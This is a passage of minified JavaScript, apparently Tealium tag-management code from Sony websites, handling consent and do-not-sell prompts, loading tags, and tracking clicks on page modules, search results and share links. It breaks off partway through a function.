s=utag.gdpr.getDeTokenizedContent(utag.gdpr.doNotSell.prompt,e),d=document.head||document.getElementsByTagName("head")[0],c=document.createElement("style"),l=document.createElement("div"),u=document.createElement("script"),g=document.body||document.getElementsByTagName("body")[0];c.type="text/css",c.id=t,c.styleSheet?c.styleSheet.cssText=s.css:c.appendChild(document.createTextNode(s.css)),d.appendChild(c),l.innerHTML=s.html,l.id=a,g.appendChild(l),u.language="javascript",u.type="text/javascript",u.text="try{"+s.js+"} catch(e){utag.DB(e)}",u.id=o,d.appendChild(u)},utag.track_old=utag.track,utag.track=function(e,t,a,o){if("string"==typeof e&&(e={event:e,data:t,cfg:{cb:a,uids:o}}),"update_consent_cookie"===e.event&&t.consent_categories)utag.gdpr.updateConsentCookie(t.consent_categories);else{if("set_dns_state"!==e.event||void 0===t.do_not_sell){if(0===utag.gdpr.getConsentState()&&(utag.gdpr.noqueue||utag.gdpr.queue.push({event:e.event,data:utag.handler.C(e.data),cfg:utag.handler.C(e.cfg)})),e.cfg.uids){for(var i=[],r=0;r<e.cfg.uids.length;r++)utag.gdpr.shouldTagFire(e.cfg.uids[r])||i.push(e.cfg.uids[r]);e.cfg.uids=i,utag.gdpr.trackUIDs=utag.gdpr.trackUIDs.concat(i)}return utag.track_old.apply(this,arguments)}utag.gdpr.dns.setDnsState(t.do_not_sell)}},utag.loader.OU_old=utag.loader.OU,utag.loader.OU=function(e){try{if("undefined"!==utag.gdpr.typeOf(e))return utag.gdpr.shouldTagFire();utag.gdpr.applyConsentState()}catch(e){utag.DB(e)}},utag.gdpr.preferences_prompt.single_cookie&&(window.utag_cfg_ovrd=window.utag_cfg_ovrd||{},utag.loader.SC("utag_main",null,"da"),window.utag_cfg_ovrd.nocookie=!0),utag.gdpr.consent_prompt.isEnabled||utag.gdpr.doNotSell.isEnabled||0!=utag.gdpr.getConsentState()||utag.gdpr.setAllCategories(utag.gdpr.preferences_prompt.defaultState,!0),"undefined"!=typeof utag_cfg_ovrd)for(utag._i in utag.loader.GV(utag_cfg_ovrd))utag.cfg[utag._i]=utag_cfg_ovrd[utag._i];utag.loader.PINIT=function(e,t,a){if(utag.DB("Pre-INIT"),!utag.cfg.noload){try{this.GET(),utag.handler.RE("view",utag.data,"blr")&&utag.handler.LR(utag.data)}catch(e){utag.DB(e)}for(t in e=this.cfg,a=0,this.GV(e))(1==e[t].block||e[t].load>0&&void 0!==e[t].src&&""!=e[t].src)&&(e[t].block=1,a=1,this.bq[t]=1);if(1==a)for(t in this.GV(e))e[t].block&&(e[t].id=t,4==e[t].load&&(e[t].load=1),e[t].cb=function(){var e=this.uid;utag.loader.cfg[e].cbf=1,utag.loader.LOAD(e)},this.AS(e[t]));0==a&&this.INIT()}},utag.loader.INIT=function(e,t,a,o,i){if(utag.DB("utag.loader.INIT"),1==this.ol)return-1;for(this.ol=1,1!=utag.cfg.noview&&utag.handler.RE("view",utag.data,"alr"),utag.rpt.ts.i=new Date,o=this.cfgsort,e=0;e<o.length;e++)i=o[e],(t=this.cfg[i]).id=i,1!=t.block&&(utag.loader.bk[t.id]||(utag.cfg.readywait||utag.cfg.noview)&&4==t.load?(this.f[t.id]=0,utag.loader.LOAD(t.id)):1==t.wait&&0==utag.loader.rf?(utag.DB("utag.loader.INIT: waiting "+t.id),this.wq.push(t),this.f[t.id]=2):t.load>0&&(utag.DB("utag.loader.INIT: loading "+t.id),this.lq.push(t),this.AS(t)));return this.wq.length>0?utag.loader.EV("","ready",(function(e){0==utag.loader.rf&&(utag.DB("READY:utag.loader.wq"),utag.loader.rf=1,utag.loader.WQ())})):this.lq.length>0?utag.loader.rf=1:0==this.lq.length&&utag.loader.END(),1},utag.loader.EV("","ready",(function(e){if(1!=utag.loader.efr){utag.loader.efr=1;try{function t(){try{utag.gdpr.consent_prompt.isEnabled&&(utag.gdpr.consent_prompt.noShow||utag.gdpr.getConsentState()||utag.gdpr.showExplicitConsent())}catch(e){utag.DB(e)}}function a(){try{utag.gdpr.doNotSell.isEnabled&&(utag.gdpr.doNotSell.noShow||utag.gdpr.dns.getDnsState()||utag.gdpr.showDoNotSellBanner())}catch(e){utag.DB(e)}}utag.cfg.readywait||utag.cfg.waittimer?utag.loader.EV("","ready",(function(){setTimeout((function(){utag.gdpr.promptEnabledSetting(),t(),a()}),utag.cfg.waittimer||1)})):(utag.gdpr.promptEnabledSetting(),t(),a())}catch(e){utag.DB(e)}try{try{/^(\/electronics\/cookie-policy\.html\/?)$/.test(utag.data["dom.pathname"])&&/((kz)?\.sony\.(ru|kz|ua))/.test(utag.data["dom.domain"])&&(cookieButtons=document.querySelectorAll('.primary-link.btn[href="https://info.evidon.com/pub_info/17276?v=1&nt=0&nw=false"]'),void 0!==cookieButtons[0]&&(cookieButtons[0].classList.add("disabled"),cookieButtons[0].href="#"),void 0!==cookieButtons[1]&&(cookieButtons[1].classList.add("disabled"),cookieButtons[1].href="#"))}catch(e){utag.DB(e)}}catch(e){utag.DB(e)}try{try{/store\.sony\.ru/gi.test(document.URL)&&(document.addEventListener("retailerSelected",(function(e){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar70,eVar42",utag_data.aaLinkTrackEvents="event31",utag_data.aaEvents.push("event31"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaRetailerName=e.detail.name,utag_data.aaLinkType="o",utag_data.aaLinkName="Retailer click - "+e.detail.name,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})),document.addEventListener(" retailerSelected ",(function(e){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar70,eVar42",utag_data.aaLinkTrackEvents="event31",utag_data.aaEvents.push("event31"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaRetailerName=e.detail.name,utag_data.aaLinkType="o",utag_data.aaLinkName="Retailer click - "+e.detail.name,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})))}catch(e){utag.DB(e)}}catch(e){utag.DB(e)}try{try{{function o(){return!~document.documentElement.className.indexOf("no-touch")}String.prototype.trim||(String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g,"")}),"undefined"!=typeof jQuery&&void 0!==jQuery().on&&function(e){e.fn.DOMNodeAppear=function(t,a){e(this);var o={keyframes:"@keyframes nodeInserted { from { opacity: 0.99; } to { opacity: 0.99; } } @-moz-keyframes nodeInserted { from { opacity: 0.99; } to { opacity: 0.99; } } @-webkit-keyframes nodeInserted { from { opacity: 0.99; } to { opacity: 0.99; } } @-ms-keyframes nodeInserted { from { opacity: 0.99; } to { opacity: 0.99; } } @-o-keyframes nodeInserted { from { opacity: 0.99; } to { opacity: 0.99; } }, ",selector:a,styles:a+" { animation-name: nodeInserted; -webkit-animation-name: nodeInserted; animation-duration: 0.001s; -webkit-animation-duration: 0.001s; }"};o.stylesClass=void 0!==a?a.replace(".",""):"",e("style.domnodeappear-keyframes").length||e("head").append("<style class='domnodeappear-keyframes'>"+o.keyframes+"</style>"),e("head").append('<style class="'+o.stylesClass+'-animation">'+o.styles+"</style>"),e(document).on("animationstart webkitAnimationStart oanimationstart MSAnimationStart",(function(a){var i=e(a.target);"nodeInserted"===a.originalEvent.animationName&&i.is(o.selector)&&"function"==typeof t&&t.call(i)}))},e.fn.onAppear=e.fn.DOMNodeAppear}(jQuery);var i="mousedown";o()&&(i="touchstart mousedown");var r="click";function n(){void 0===window.nexusIsTrackingActive&&(window.nexusIsTrackingActive=!0);var e=window.nexusIsTrackingActive;return e&&(window.nexusIsTrackingActive=!1),setTimeout((function(){window.nexusIsTrackingActive=!0}),700),e}o()&&(r="touchend click");var d=[{lv1:"editorial",lv2:"chapters",trackerFunction:"editorial_chapters",isActive:!0},{lv1:"informational",lv2:"product_summary",trackerFunction:"sticky_nav_links",isActive:!0},{lv1:"editorial",lv2:"hotspots",trackerFunction:"editorial_hotspots",isActive:!0},{lv1:"primary",lv2:"tout",trackerFunction:"primary_tout",isActive:!0},{lv1:"editorial",lv2:"dual_viewer",trackerFunction:"editorial_dual_viewer",isActive:!0},{lv1:"generic",lv2:"social_share_links",trackerFunction:"social_share_links",isActive:!0},{lv1:"search",lv2:"search_results",trackerFunction:"search_results",isActive:!0},{lv1:"editorial",lv2:"video",trackerFunction:"video_init",isActive:!0},{lv1:"informational",lv2:"feedback",trackerFunction:"user_feedback",isActive:!0},{lv1:"informational",lv2:"footer-social",trackerFunction:"footer_social_facebook_like",isActive:!0},{lv1:"search",lv2:"search_results",trackerFunction:"search_results_load_more",isActive:!0},{lv1:"editorial",lv2:"image",trackerFunction:"editorial_image_feature_switch",isActive:!0},{lv1:"generic",lv2:"oof_module",trackerFunction:"fourk_oof_module_sticky_nav_links",isActive:!0},{lv1:"editorial",lv2:"multiple",trackerFunction:"slider_arrow_clicks",isActive:!0},{lv1:"informational",lv2:"sku-selection",trackerFunction:"eu_transition_page",isActive:!0},{lv1:"generic",lv2:"pagination",trackerFunction:"bullet_navigation_clicks",isActive:!0},{lv1:"generic",lv2:"pagination",trackerFunction:"swipe_gestures",isActive:!0},{lv1:"informational",lv2:"product_summary",trackerFunction:"variations_list_open",isActive:!0},{lv1:"editorial",lv2:"3d_viewer",trackerFunction:"ru_3d_viewer",isActive:!0},{lv1:"gallery",lv2:"tabs",trackerFunction:"gallery_product_differentiator",isActive:!0},{lv1:"editorial",lv2:"360_viewer",trackerFunction:"editorial_360_viewer",isActive:!0},{lv1:"generic",lv2:"ru-dealer-locator",trackerFunction:"ru_dealer_locator_gmaps",isActive:!0},{lv1:"generic",lv2:"ru-dealer-locator",trackerFunction:"ru_dealer_locator_phone",isActive:!0},{lv1:"generic",lv2:"ru-dealer-locator",trackerFunction:"ru_dealer_locator_search",isActive:!1},{lv1:"navigation",lv2:"icon_banner",trackerFunction:"spt_footer_icon_banner_clicks",isActive:!0},{lv1:"generic",lv2:"oof_module",trackerFunction:"ces_oof_module_sticky_nav_links",isActive:!0},{lv1:"ces",lv2:"tout",trackerFunction:"ces_primary_tout_clicks",isActive:!0},{lv1:"generic",lv2:"oof_module",trackerFunction:"ces_newsletter_subscription",isActive:!0},{lv1:"generic",lv2:"oof_module",trackerFunction:"pic_qual_oof_module_sticky_nav_links",isActive:!0},{lv1:"generic",lv2:"oof_module",trackerFunction:"ru_oof_extrabass",isActive:!0},{lv1:"search",lv2:"important_information_label",trackerFunction:"spt_important_information_label",isActive:!0},{lv1:"generic",lv2:"oof_module",trackerFunction:"ifa_oof_module_sticky_nav_links",isActive:!0},{lv1:"generic",lv2:"oof_module",trackerFunction:"ru_oof_presale",isActive:!0},{lv1:"informational",lv2:"html_template",trackerFunction:"flexiModule",isActive:!0},{lv1:"editorial",lv2:"slideshow",trackerFunction:"editorial_slideshow",isActive:!0},{lv1:"tertiary",lv2:"tout_container",trackerFunction:"tertiary_tout_container",isActive:!0},{lv1:"review",lv2:"listing",trackerFunction:"google_translate_links",isActive:!0},{lv1:"secondary",lv2:"only_sony_carousel",trackerFunction:"choose_your_section",isActive:!0},{lv1:"generic",lv2:"oof_module",trackerFunction:"editorial_anchor_links",isActive:!0},{lv1:"editorial",lv2:"video",trackerFunction:"anchor_links",isActive:!0}];-1===document.URL.toLowerCase().indexOf("/search?")&&-1===document.URL.toLowerCase().indexOf("/results?")&&(d[10].isActive=!1),(document.URL.toLowerCase().indexOf("4k-ultra-hd-tv")>-1||document.URL.toLowerCase().indexOf("4k.sony")>-1)&&"undefined"!=typeof jQuery&&jQuery(document).ready((function(){jQuery(".jump-links a").each((function(){void 0!==jQuery(this).attr("href")&&jQuery(this).data("link-label",jQuery(this).attr("href").replace("#",""))})),jQuery("#section-4k").before('<div class="visuallyhidden moduleTags" data-name="section_4k" data-mastername="section_4k" data-lv1="editorial" data-lv2="chapters"></div>'),jQuery("#section-design").before('<div class="visuallyhidden moduleTags" data-name="section_design" data-mastername="section_design" data-lv1="editorial" data-lv2="chapters"></div>'),jQuery("#section-sony-4k").before('<div class="visuallyhidden moduleTags" data-name="section-sony-4k" data-mastername="section-sony-4k" data-lv1="editorial" data-lv2="chapters"></div>')}));var c={};c.editorial_chapters=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on(r,".moduleTags[data-lv1='editorial'][data-lv2='chapters'] + section .thumb-nav li, .moduleTags[data-lv1='editorial'][data-lv2='chapters'] + div .thumb-nav li",(function(){if(n()){var e=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===e&&(e=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var t=jQuery(this).index()+1,a="";""===(a=jQuery(this).parents(".editorial-chapters").find(".chapter-slide:nth-child("+t+")").data("mastername"))&&(a=t),jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"chapters",masterName:e,clickedElement:e+" | Module interaction - Chapter: "+a,clickedElementType:"chapter"})}}))},c.sticky_nav_links=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".moduleTags[data-lv1='informational'][data-lv2='product_summary'] + section .jump-links li a",(function(){if(n()){var e="",t="";void 0!==this&&void 0!==this.href&&(e=void 0!==jQuery(this).data("link-label")&&""!==jQuery(this).data("link-label")?jQuery(this).data("link-label"):this.innerText||this.textContent),t="Module interaction - Product nav link"+(e.trim().length>0?":"+e:"");var a=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername")||jQuery(this).closest("section").parent("section").prev(".visuallyhidden.moduleTags").attr("data-mastername")||"pdp-sticky_nav";t=a+" | "+t,jQuery("body").trigger({type:"moduleInteraction",lv1:"informational",lv2:"product_summary",masterName:a,clickedElement:t,clickedElementType:"sticky_nav_link"})}}))},c.editorial_hotspots=function(e){if("undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").on("mousedown",".hotspot-module .hspot-outer .hspot-core",(function(e){if(n()&&("mousedown"===e.type&&1===e.which||"touchstart"===e.type)){var t="";if(jQuery(this).closest("section").length>0?""!==(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername"))&&null!==t||(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername")):jQuery(this).closest("div.editorial-chapters-container").length>0&&(""!==t&&null!==t||(t=jQuery(this).closest("div.editorial-chapters-container").prev(".visuallyhidden.moduleTags").attr("data-mastername"))),this.className.indexOf("hspot-core-on")>0);else{var a="";""!==(a=jQuery(this).parents(".hspot-outer").data("mastername"))&&(a=": "+a),jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"hotspots",masterName:t,clickedElement:t+" | Module interaction - Hospot"+a,clickedElementType:"hotspot_open"})}}})),jQuery("body").on("click",".editorial_hotspots  .btn.primary-link[href='#external-monitor']",(function(e){jQuery(this).closest("section").length>0&&(moduleMastername=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername"),""!==moduleMastername&&null!==moduleMastername||(moduleMastername=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"))),jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"hotspots",masterName:moduleMastername,clickedElement:moduleMastername+" | Module interaction - Hotspot External Monitor",clickedElementType:"learn_more_about_updates"})}))),void 0!==jQuery("body").on&&void 0!==jQuery.fn.DOMNodeAppear){var t=".moduleTags[data-lv1='editorial'][data-lv2='hotspots'] + section .prospect-box__confirmation";jQuery(t).DOMNodeAppear((function(e){var t="";jQuery(this).closest("section").length>0&&(""!==(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername"))&&null!==t||(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"))),""!==t&&jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"hotspots",masterName:t,clickedElement:t+" | Module interaction - Stay informed",clickedElementType:"subscribe_button"})}),t)}},c.primary_tout=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").on("click",".moduleTags[data-lv1='primary'][data-lv2='tout'] + section .linkgroup a.carousel",(function(){if(n()){var e=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===e&&(e=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername")),jQuery("body").trigger({type:"moduleInteraction",lv1:"primary",lv2:"tout",masterName:e,clickedElement:e+" | Module interaction - View slideshow",clickedElementType:"slideshow_link"})}})),jQuery("body").on("click",".moduleTags[data-lv1='primary'][data-lv2='tout'] + section .linkgroup a[href^='#video'], .moduleTags[data-lv1='primary'][data-lv2='tout'] + section .linkgroup a[href='#Video'], .moduleTags[data-lv1='primary'][data-lv2='tout'] + section .linkgroup a[data-media='video'], .moduleTags[data-lv1='primary'][data-lv2='tout'] + section .linkgroup a[href='#PV'], .moduleTags[data-lv1='primary'][data-lv2='tout'] + section .linkgroup a[href='#Productvideo']",(function(){if(n()){var e=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===e&&(e=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername")),e=e.replace("-UKDE",""),jQuery("body").trigger({type:"moduleInteraction",lv1:"primary",lv2:"tout",masterName:e,clickedElement:e+" | Module interaction - Play video",clickedElementType:"play_video_link"})}})),jQuery("body").on("click",".moduleTags[data-lv1='primary'][data-lv2='tout'] + section .linkgroup a.btn.pct-n-0-page.lt3, .moduleTags[data-lv1='primary'][data-lv2='tout'] + section .linkgroup a.btn.pct-n-0-anchor.lt3,.moduleTags[data-lv1='primary'][data-lv2='tout'] + section a.btn.pct-n-0-product_specifications.lt3",(function(){if(n()){var e=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"),t=jQuery(this).attr("title");jQuery("body").trigger({type:"moduleInteraction",lv1:"primary",lv2:"tout",masterName:e,clickedElement:e+" | Module interaction - "+t,clickedElementType:"primary_tout_link"})}})))},c.editorial_dual_viewer=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery(".moduleTags[data-lv1='editorial'][data-lv2='dual_viewer'] + section .scrubber .handle").on(i,(function(e){if(n()&&("mousedown"===e.type&&1===e.which||"touchstart"===e.type)){var t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").data("mastername");jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"dual_viewer",masterName:t,clickedElement:t+" | Module interaction - Dual viewer",clickedElementType:"dual_viewer"})}})),jQuery(".moduleTags[data-lv1='editorial'][data-lv2='dual_viewer'] + section figcaption").on(r,(function(e){var t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var a=jQuery(this).text(),o=t+" | Module interaction - Dual viewer caption click";null!=a&&(o=o+":"+a),jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"dual_viewer",masterName:t,clickedElement:o,clickedElementType:"dual_viewer"})})))},c.social_share_links=function(e){if("undefined"!=typeof jQuery&&void 0!==jQuery().on){var t="";jQuery(".moduleTags[data-lv1='informational'][data-lv2='product_summary'] + section .share-menu .social-link, .moduleTags[data-lv1='navigational'][data-lv2='social-shares'] + section .share-menu .social-link").on("click",(function(){n()&&(void 0!==jQuery(this)&&jQuery(this).attr("class")&&(jQuery(this).attr("class").indexOf("facebook")>-1?t="Facebook":jQuery(this).attr("class").indexOf("twitter")>-1?t="Twitter":jQuery(this).attr("class").indexOf("gplus")>-1?t="Google+":jQuery(this).attr("class").indexOf("pinterest")>-1&&(t="Pinterest")),a(t))})),jQuery("#social-blocks-right a").on("click",(function(){n()&&(void 0!==jQuery(this)&&jQuery(this).attr("class")&&(jQuery(this).attr("class").indexOf("facebook")>-1?t="Facebook":jQuery(this).attr("class").indexOf("twitter")>-1?t="Twitter":jQuery(this).attr("class").indexOf("gplus")>-1?t="Google+":jQuery(this).attr("class").indexOf("pinterest")>-1&&(t="Pinterest")),a(t))})),jQuery("#socialIconsRight a").on("click",(function(){n()&&(void 0!==jQuery(this)&&jQuery(this).attr("class")&&(jQuery(this).attr("class").indexOf("facebook")>-1?t="Facebook":jQuery(this).attr("class").indexOf("twitter")>-1?t="Twitter":jQuery(this).attr("class").indexOf("gplus")>-1?t="Google+":jQuery(this).attr("class").indexOf("pinterest")>-1&&(t="Pinterest")),a(t))}));var a=function(e){""!==e&&jQuery("body").trigger({type:"social_link_click",lv1:"generic",lv2:"social_share_links",masterName:e+" click",clickedElement:e,clickedElementType:"social_share_link"})}}},c.search_results=function(e){var t,a;"undefined"!=typeof jQuery&&void 0!==jQuery().on&&("undefined"!=typeof jQuery&&jQuery("body").on("click",".organic-results ul.generic-results a, #faq_results-container ul.generic-results a",(function(o){if(window.location.href.toLowerCase().indexOf("/results")>-1&&window.location.href.toLowerCase().indexOf("/electronics/support")>-1){var i=0,r="",n=!0,s=o.currentTarget.href.toLowerCase(),d=sgwn&&sgwn.linkDownloadFileTypes?sgwn.linkDownloadFileTypes.replace(/,/gi,"|"):"exe|zip|wav|mp3|mov|mpg|avi|wmv|pdf|doc|docx|xls|xlsx|ppt|pptx";try{t=jQuery(".generic-results .item-link"),a=jQuery(this).closest(".generic-results .item-link"),i=t.index(a)+1}catch(o){}new RegExp("\\.("+d+")").test(s)&&(n=!1);try{r=sony.digital.analytics.search.term}catch(o){}""===r&&"undefined"!=typeof sgwn&&(r=sgwn.prop41||""),n&&jQuery("body").trigger({type:"searchResultClick",lv1:e.lv1||"",lv2:e.lv2||"",masterName:"organic-search_results",clickedElement:i+" | "+r,clickedElementType:"search_results",clickedLinkURL:s})}})),window.location.href.toLowerCase().indexOf("/electronics/support")>-1&&"undefined"!=typeof jQuery&&jQuery("body").on("click",".type-ahead-wrapper ul a",(function(o){t=jQuery(".js-search-top .type-ahead-wrapper li"),a="";var i=0;try{a=jQuery(this).closest(".js-search-top .type-ahead-wrapper li")}catch(o){}""!==a&&(i=t.index(a)+1);var r="";try{r=jQuery("input.search-form-input").attr("value")}catch(o){}jQuery("body").trigger({type:"recommendationSearchResultClick",lv1:e.lv1||"",lv2:e.lv2||"",masterName:"recommendation-seach_results",clickedElement:i+" | "+r,clickedElementType:"search_results"})})),window.location.href.indexOf("/search?query=")>-1&&"undefined"!=typeof jQuery&&jQuery(".results-list").length>0&&jQuery("body").on("click","ul.results-list a, div.results-list",(function(o){t=0===jQuery(".results-list li").length?jQuery(".results-list"):jQuery(".results-list > li"),a=0===jQuery(".results-list li").length?jQuery(this).closest(".results-list"):jQuery(this).closest(".results-list > li");var i=t.index(a)+1,r="";"undefined"!=typeof sgwn?r=sgwn.prop41||"":jQuery(".search-results").length>0&&void 0!==jQuery(".search-results").data("search-term")?r=jQuery(".search-results").data("search-term"):"undefined"!=typeof tags_searchTerm&&(r=tags_searchTerm),jQuery("body").trigger({type:"searchResultClick",lv1:e.lv1||"",lv2:e.lv2||"",masterName:"organic-search_results",clickedElement:i+" | "+r,clickedElementType:"search_results"})})),window.location.href.indexOf("/search?query=")>-1&&"undefined"!=typeof jQuery&&jQuery(".search-results").length>0&&jQuery("body").on("click",".search-results .zero-results-container .main-navigation-item-list .navigation-item-link-li a",(function(t){var a=jQuery(".search-results .zero-results-container .main-navigation-item-list .navigation-item-link-li a").index(jQuery(this))+1,o="";"undefined"!=typeof sgwn?o=sgwn.prop41||"":jQuery(".search-results").length>0&&void 0!==jQuery(".search-results").data("search-term")?o=jQuery(".search-results").data("search-term"):"undefined"!=typeof tags_searchTerm&&(o=tags_searchTerm),jQuery("body").trigger({type:"recommendationSearchResultClick",lv1:e.lv1||"",lv2:e.lv2||"",masterName:"recommendation-search_results",clickedElement:a+" | "+o,clickedElementType:"search_results"})})))},c.user_feedback=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("user_feedback","#lws-feedback-form",(function(e,t){var a=t.rating||"",o=t.feedbackText||"";o=o.substr(0,235);var i="undefined"!=typeof sony&&void 0!==sony.digitalData&&sony.digitalData.product||{},r=_bsq.aa.getMostGranularProductID(i);jQuery("body").trigger({type:"userfeedback_submitted",lv1:"informational",lv2:"feedback",masterName:"pdp-feedback",clickedElement:r+"|"+a+"|"+o,clickedElementType:"user_feedback_form"})}))},c.footer_social_facebook_like=function(e){var t,a;"undefined"!=typeof jQuery&&(t="FB",a=function(e){"undefined"!=typeof FB&&void 0!==FB.Event&&FB.Event.subscribe("edge.create",(function(e,t){jQuery("body").trigger({type:"social_facebook_like",lv1:"informational",lv2:"footer-social",masterName:"footer-social-facebook",clickedElement:"Facebook",clickedElementType:"facebook_like_button"})}))},window.setTimeout((function(){window[t]?a(window[t]):window.setTimeout(arguments.callee,500)}),500))},c.search_results_load_more=function(e){if("undefined"!=typeof jQuery&&void 0!==jQuery().on){var t="";if("undefined"!=typeof sony&&void 0!==sony.digitalData){var a=sony.digitalData.search||{};t=a.term||""}else t=window.tags_searchTerm||"";jQuery(".search-results").on("click",".btn.btn-alt-special.btn-alt-plus.search-more",(function(){jQuery("body").trigger({type:"loadMoreSearchResults",lv1:e.lv1||"",lv2:e.lv2||"",masterName:"organic-search_results",clickedElement:"Search results - Load more:"+t,clickedElementType:"search_results-load_more"})}))}},c.editorial_image_feature_switch=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").on("click",".moduleTags[data-lv1='editorial'][data-lv2='image'] + section .switchToggle",(function(e){if(n()){var t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").attr("data-mastername")),jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"image",masterName:t,clickedElement:t+" | Module interaction - Image feature switch",clickedElementType:"image_feature_switch"})}})),jQuery("body").on("click",".moduleTags[data-mastername^='E-Img-transition-'] + section.editorial_image a.primary-link.btn",(function(e){if(n()){var t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var a=jQuery(this).attr("title")||"";jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"image",masterName:t,clickedElement:t+" | Module interaction - Transition link: "+a,clickedElementType:"transition_link",additionalVariables:"products"})}})),jQuery("body").on("click",".moduleTags[data-lv1='editorial'][data-lv2='image']:not([data-masterName^='E-Img-transition-']) + section a.primary-link[href*='#']",(function(e){if(n()){var t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var a;a=jQuery(this).attr("href").replace("#","").replace("_"," "),jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"image",masterName:t,clickedElement:t+" | Module interaction - Chapter link: "+a,clickedElementType:"image_chapter_link"})}})))},c.fourk_oof_module_sticky_nav_links=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".moduleTags[data-mastername='Page-Nav-PDP-BRAVIA-OOF-en_GL-2015-03-M02-braviadifference'] + div .jump-links li a",(function(){var t="",a="";void 0!==this&&void 0!==this.href&&(t=""!==jQuery(this).attr("href")?jQuery(this).attr("href").replace("#",""):this.innerText||this.textContent),a=void 0!==t&&t.trim().length>0?"Module interaction - Module sticky nav link:"+t:"Module interaction - Module sticky nav link";var o=jQuery(this).closest("div.editorial-anchor-links-wrapper").prev(".visuallyhidden.moduleTags").data("mastername");""===o&&(o=jQuery(this).closest("div.editorial-anchor-links-wrapper").prev(".visuallyhidden.moduleTags").attr("data-mastername")),jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:o,clickedElement:o+" | "+a,clickedElementType:"4k_oof_module_sticky_nav_links"})}))},c.slider_arrow_clicks=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").on("click",".moduleTags[data-lv1='editorial'][data-lv2='chapters'] + section .pagination-paddles a, .moduleTags[data-lv1='secondary'][data-lv2='only_sony_carousel'] + section .pagination-paddles a, .moduleTags[data-lv1='editorial'][data-lv2='carousel'] + section .pagination-paddles a, .moduleTags[data-lv1='editorial'][data-lv2='slideshow'] + section .pagination-paddles a, .moduleTags[data-mastername*='Custom-Ent-PSN-en_GL'] + section .pagination-paddles a, .moduleTags[data-lv1='informational'][data-lv2='sku-selection'] + section .pagination-paddles a, .moduleTags[data-lv1='informational'][data-lv2='reviews_awards_v2'] + section .pagination-paddles a, .moduleTags[data-lv1='gallery'][data-lv2='related_products'] + section .pagination-paddles a",(function(){if(n()){var t=jQuery(this).index()+1,a="Module interaction - Slider arrow";1===t?a+=":Previous":2===t&&(a+=":Next");var o=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===o&&(o=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var i=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-lv2")||e.lv2||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:i,masterName:o,clickedElement:o+" | "+a,clickedElementType:"slider_arrow"})}})),jQuery("body").on("click",".moduleTags[data-lv1='editorial'][data-lv2='slideshow'] + section .pagination-paddles span[class*='pagination-paddle']",(function(){if(n()){var 